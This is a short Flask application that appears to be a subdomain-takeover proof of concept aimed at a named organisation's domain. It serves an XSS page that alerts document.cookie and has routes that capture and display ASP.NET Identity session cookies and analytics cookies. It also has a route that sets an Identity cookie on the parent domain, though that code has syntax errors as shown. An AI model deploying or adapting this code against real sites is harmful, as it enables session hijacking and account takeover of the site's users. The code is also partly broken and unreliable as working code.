from flask import Flask, request, make_response
app = Flask(__name__)

@app.route("/")
def hello():
    return ""

@app.route("/20wk2yc8p6caztasx7bb")
def hello_poc():
    return "<!-- subdomain takeover PoC by Dominique van Dorsselaer -->"

@app.route("/30prbe8wn2ap79kjt1he")
def hello_poc_sxss():
    return "<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html><!DOCTYPE html><title></title>"

@app.route('/signin-oidc')
def collect_cookies_2():
    _ga = request.cookies.get('_ga')
    _gid = request.cookies.get('_gid')
    C0 = request.cookies.get('.AspNetCore.Identity.Application')
    C1 = request.cookies.get('.AspNetCore.Identity.ApplicationC1')
    C2 = request.cookies.get('.AspNetCore.Identity.ApplicationC2')
    T1 = request.cookies.get('.AspNetCore.Correlation.5GNyQuh7Z1_6Nho-B_syD_vPRcAFtAt9vrQMGHSEqhc')
    return f"Cookies to collect: \n\n" \
    f"_ga = {_ga} \n\n" \
    f"_gid = {_gid} \n\n" \
    f".AspNetCore.Identity.ApplicationC1 = {C1} \n\n" \
    f".AspNetCore.Identity.ApplicationC2 = {C2} \n\n" \
    f".AspNetCore.Identity.Application = {C0} \n\n" \
    f".AspNetCore.Correlation = {T1} \n\n"

@app.route('/6w1ymvcfdrf33n7m2cc6')
def collect_cookies():
    _ga = request.cookies.get('_ga')
    _gid = request.cookies.get('_gid')
    return f"Cookies to collect: \n\n" \
    f"_ga = {_ga} \n\n" \
    f"_gid = {_gid} \n\n"

@app.route("/cookie")
def cookies():
    resp = make_response("Set Cookies")
    cookies = request.cookies
    print(cookies)

    resp.set_cookie(
    ".AspNetCore.Identity.ApplicationC1",
    value="aaaa",
    max_age=60
    path='/',
    domain=.pggmenco.nl,
    secure=True,
    httponly=True
    #samesite=None
    )

    return resp
